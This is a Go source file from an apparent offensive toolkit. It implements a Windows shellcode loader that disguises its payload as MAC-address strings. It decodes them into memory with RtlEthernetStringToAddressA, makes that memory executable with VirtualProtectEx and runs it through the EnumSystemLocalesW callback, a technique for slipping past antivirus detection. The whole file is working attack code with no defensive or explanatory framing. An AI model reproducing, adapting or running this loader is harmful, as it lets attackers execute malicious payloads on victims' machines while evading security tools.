package loader

import (
	"unsafe"
	"variant/log"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func MacAddressA(shellcode []string) {
	addr, _, err := wdll.AllocADsMem().Call(uintptr(len(shellcode) * 6))
	if addr == 0 || err.Error() != "The operation completed successfully." {
		log.Fatalf("AllocADsMem() err: %v", err)
	}

	addrptr := addr
	for _, mac := range shellcode {
		u := append([]byte(mac), 0)

		_, _, err = wdll.RtlEthernetStringToAddressA().Call(uintptr(unsafe.Pointer(&u[0])), uintptr(unsafe.Pointer(&u[0])), addrptr)
		if err != nil && err.Error() != "The operation completed successfully." {
			log.Fatalf("RtlEthernetStringToAddressA() err: %v", err)
		}

		addrptr += 6
	}

	oldProtect := windows.PAGE_READWRITE
	wdll.VirtualProtectEx().Call(
		uintptr(windows.CurrentProcess()),
		addr,
		uintptr(len(shellcode)*6),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))

	wdll.EnumSystemLocalesW().Call(addr, 0)
}
